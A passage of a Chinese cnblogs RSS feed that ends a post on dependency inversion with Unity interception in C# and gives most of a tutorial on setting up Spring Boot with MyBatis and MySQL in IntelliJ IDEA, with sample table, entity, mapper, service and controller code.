        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; IMethodReturn Invoke(IMethodInvocation input, GetNextInterceptionBehaviorDelegate getNext)
        {
            IMethodReturn methodReturn &lt;/span&gt;=&lt;span&gt; getNext()(input, getNext);

            Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ExceptionLoggingBehavior&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (methodReturn.Exception == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
            {
                Console.WriteLine(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;无异常&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                Console.WriteLine($&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;异常:{methodReturn.Exception.Message}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
            }
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; methodReturn;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt;&lt;span&gt; WillExecute
        {
            &lt;/span&gt;&lt;span&gt;get&lt;/span&gt; { &lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;; }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;例子4 数据访问层的替换，因为已经不依赖具体实现，把配置文件的接口对应的数据访问层实现类替换即可，配置文件格式为InterFace Map 实现类&lt;/p&gt;
&lt;p&gt;数据访问层的封装公共增删改查，Unity 管理 EF DBcontext，保持全局或线程单例还没有看到，最近在学内存管理和.Net垃圾回收&lt;/p&gt;

</description>
<pubDate>Sun, 07 Oct 2018 14:00:00 +0000</pubDate>
<dc:creator>从未太晚</dc:creator>
<og:description>DIP依赖倒置原则：系统架构时，高层模块不应该依赖于低层模块，二者通过抽象来依赖依赖抽象，而不是细节 贯彻依赖倒置原则，左边能抽象，右边实例化的时候不能直接用抽象，所以需要借助一个第三方</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kongsq/p/9751716.html</dc:identifier>
</item>
<item>
<title>详解intellij idea搭建SpringBoot - 请叫我头头哥</title>
<link>http://www.cnblogs.com/toutou/p/9650939.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/toutou/p/9650939.html</guid>
<description>&lt;div class=&quot;bodyCustomClass&quot; readability=&quot;32.5&quot;&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;Spring Boot是由Pivotal团队提供的全新框架，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置。通过这种方式，Spring Boot致力于在蓬勃发展的快速应用开发领域(rapid application development)成为领导者。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/div&gt;
&lt;h2 id=&quot;_nav_0&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;Spring Boot概念&lt;/h2&gt;
&lt;p&gt;从最根本上来讲，Spring Boot就是一些库的集合，它能够被任意项目的构建系统所使用。简便起见，该框架也提供了命令行界面，它可以用来运行和测试Boot应用。框架的发布版本，包括集成的CLI（命令行界面），可以在Spring仓库中手动下载和安装。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;创建独立的Spring应用程序&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;嵌入的Tomcat，无需部署WAR文件&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;简化Maven配置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;自动配置Spring&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;提供生产就绪型功能，如指标，健康检查和外部配置&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;绝对没有代码生成并且对XML也没有配置要求&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;_nav_1&quot; class=&quot;blogCustomTitleStyle&quot;&gt;&lt;span class=&quot;blogCustomTitleIco&quot;&gt;v&lt;/span&gt;搭建Spring Boot&lt;/h2&gt;
&lt;p&gt;1. 生成模板&lt;/p&gt;
&lt;p&gt;可以在官网&lt;a title=&quot;hystrix&quot; href=&quot;https://start.spring.io/&quot; target=&quot;_blank&quot;&gt;https://start.spring.io/&lt;/a&gt;生成spring boot的模板。如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915163625465-346623591.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后用idea导入生成的模板,导入有疑问的可以看我另外一篇&lt;a title=&quot;IntelliJ IDEA&quot; href=&quot;https://www.cnblogs.com/toutou/p/9651398.html&amp;quot;&quot; target=&quot;_blank&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915163639943-856078236.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;

&lt;p&gt;2. 创建Controller&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915164114033-855032930.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;3. 运行项目&lt;/p&gt;
&lt;p&gt;添加注解 &lt;code&gt;@ComponentScan&lt;/code&gt;(注解详情点&lt;a title=&quot;hystrix&quot; href=&quot;https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/context/annotation/ComponentScan.html&quot; target=&quot;_blank&quot;&gt;这里&lt;/a&gt;) 然后运行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915164132925-4876133.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在看到&quot;Compilation completed successfully in 3s 676ms&quot;消息之后，打开任意浏览器，输入 http://localhost:8080/index 即可查看效果，如下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915164152188-1766537788.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;

&lt;p&gt;4. 接入mybatis&lt;/p&gt;
&lt;p&gt;&lt;a title=&quot;hystrix&quot; href=&quot;http://www.mybatis.org/mybatis-3/getting-started.html&quot; target=&quot;_blank&quot;&gt;MyBatis&lt;/a&gt; 是一款优秀的持久层框架，它支持定制化 SQL、存储过程以及高级映射。&lt;/p&gt;
&lt;p&gt;在项目对象模型pom.xml中插入mybatis的配置&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;org.mybatis.spring.boot&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mybatis-spring-boot-starter&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;1.1.1&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mysql&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;groupId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;mysql-connector-java&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;artifactId&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;5.1.30&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;version&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;dependency&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;创建数据库以及user表&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;56&quot;&gt;
&lt;pre&gt;
&lt;span&gt;use&lt;/span&gt;&lt;span&gt; zuche;
&lt;/span&gt;&lt;span&gt;CREATE&lt;/span&gt; &lt;span&gt;TABLE&lt;/span&gt;&lt;span&gt; `users` (
    `id` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;) unsigned &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt; AUTO_INCREMENT,
    `username` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
    `age` &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;(&lt;span&gt;10&lt;/span&gt;) &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
    `phone` &lt;/span&gt;&lt;span&gt;bigint&lt;/span&gt; &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
    `email` &lt;/span&gt;&lt;span&gt;varchar&lt;/span&gt;(&lt;span&gt;255&lt;/span&gt;) &lt;span&gt;NOT&lt;/span&gt; &lt;span&gt;NULL&lt;/span&gt;&lt;span&gt;,
    &lt;/span&gt;&lt;span&gt;PRIMARY&lt;/span&gt; &lt;span&gt;KEY&lt;/span&gt;&lt;span&gt; (`id`)
)ENGINE&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;InnoDB AUTO_INCREMENT&lt;span&gt;=&lt;/span&gt;&lt;span&gt;1&lt;/span&gt; &lt;span&gt;DEFAULT&lt;/span&gt; CHARSET&lt;span&gt;=&lt;/span&gt;&lt;span&gt;utf8;
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; users &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;1&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;赵&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;23&lt;/span&gt;,&lt;span&gt;158&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;3658561548@qq.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; users &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;2&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;钱&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;27&lt;/span&gt;,&lt;span&gt;136&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;3658561548@126.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; users &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;孙&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;31&lt;/span&gt;,&lt;span&gt;159&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;3658561548@163.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt; &lt;span&gt;into&lt;/span&gt; users &lt;span&gt;values&lt;/span&gt;(&lt;span&gt;4&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;李&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;35&lt;/span&gt;,&lt;span&gt;130&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;3658561548@sina.com&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;分别创建三个包，分别是dao/pojo/service, 目录如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/506684/201809/506684-20180915164314716-173298751.png&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;/p&gt;
&lt;p&gt;添加User：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('59885709-fd78-4596-8de5-c06eb12d40a9')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_59885709-fd78-4596-8de5-c06eb12d40a9&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_59885709-fd78-4596-8de5-c06eb12d40a9&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('59885709-fd78-4596-8de5-c06eb12d40a9',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_59885709-fd78-4596-8de5-c06eb12d40a9&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.pojo;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Created by toutou on 2018/9/15.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; User {
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; id;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String username;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer age;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; Integer phone;
    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt;&lt;span&gt; String email;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; getId() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setId(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; id) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.id =&lt;span&gt; id;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getUsername() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; username;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setUsername(String username) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.username =&lt;span&gt; username;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Integer getAge() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; age;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setAge(Integer age) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.age =&lt;span&gt; age;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Integer getPhone() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; phone;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setPhone(Integer phone) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.phone =&lt;span&gt; phone;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getEmail() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; email;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setEmail(String email) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.email =&lt;span&gt; email;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;添加UserMapper：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('d4bf84c8-df46-48f4-9291-fbda2f77e813')&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_d4bf84c8-df46-48f4-9291-fbda2f77e813&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_d4bf84c8-df46-48f4-9291-fbda2f77e813&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('d4bf84c8-df46-48f4-9291-fbda2f77e813',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_d4bf84c8-df46-48f4-9291-fbda2f77e813&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.dao;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.pojo.User;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.ibatis.annotations.Mapper;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.apache.ibatis.annotations.Select;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Created by toutou on 2018/9/15.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Mapper
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; UserMapper {
    @Select(&lt;/span&gt;&quot;SELECT id,username,age,phone,email FROM USERS WHERE AGE=#{age}&quot;&lt;span&gt;)
    List&lt;/span&gt;&amp;lt;User&amp;gt; getUser(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;添加UserService：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('b3cfe296-4e0b-421a-a2af-9d37409b8e7d')&quot; readability=&quot;31.5&quot;&gt;&lt;img id=&quot;code_img_closed_b3cfe296-4e0b-421a-a2af-9d37409b8e7d&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_b3cfe296-4e0b-421a-a2af-9d37409b8e7d&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('b3cfe296-4e0b-421a-a2af-9d37409b8e7d',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_b3cfe296-4e0b-421a-a2af-9d37409b8e7d&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.pojo.User;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Created by toutou on 2018/9/15.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; UserService {
    List&lt;/span&gt;&amp;lt;User&amp;gt; getUser(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;添加UserServiceImpl&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('6eaa4233-a170-473a-9185-8aa0c81ff525')&quot; readability=&quot;32.5&quot;&gt;&lt;img id=&quot;code_img_closed_6eaa4233-a170-473a-9185-8aa0c81ff525&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_6eaa4233-a170-473a-9185-8aa0c81ff525&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('6eaa4233-a170-473a-9185-8aa0c81ff525',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_6eaa4233-a170-473a-9185-8aa0c81ff525&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;60&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.dao.UserMapper;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.pojo.User;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Created by toutou on 2018/9/15.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@Service
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; UserServiceImpl &lt;span&gt;implements&lt;/span&gt;&lt;span&gt; UserService{
    @Autowired
    UserMapper userMapper;

    @Override
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;User&amp;gt; getUser(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; userMapper.getUser(age);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;controller添加API方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('ea8c3403-af97-4ed7-b840-9892d842f899')&quot; readability=&quot;34.5&quot;&gt;&lt;img id=&quot;code_img_closed_ea8c3403-af97-4ed7-b840-9892d842f899&quot; class=&quot;code_img_closed&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;img id=&quot;code_img_opened_ea8c3403-af97-4ed7-b840-9892d842f899&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('ea8c3403-af97-4ed7-b840-9892d842f899',event)&quot; src=&quot;https://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;详解intellij idea搭建Spring Boot&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_ea8c3403-af97-4ed7-b840-9892d842f899&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;64&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.athm.controller;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.pojo.User;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.athm.service.UserService;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Controller;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.GetMapping;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RequestMapping;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.ResponseBody;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RestController;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.HashMap;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Map;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * Created by toutou on 2018/9/15.
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RestController
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; IndexController {
    @Autowired
    UserService userService;
    @GetMapping(&lt;/span&gt;&quot;/show&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;User&amp;gt; getUser(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; age){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; userService.getUser(age);
    }

    @RequestMapping(&lt;/span&gt;&quot;/index&quot;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Map&amp;lt;String, String&amp;gt;&lt;span&gt; Index(){
        Map map &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; HashMap&amp;lt;String, String&amp;gt;&lt;span&gt;();
        map.put(&lt;/span&gt;&quot;北京&quot;,&quot;北方城市&quot;&lt;span&gt;);
        map.put(&lt;/span&gt;&quot;深圳&quot;,&quot;南方城市&quot;&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; map;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;View Code&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;修改租车ZucheApplication&lt;/p&gt;
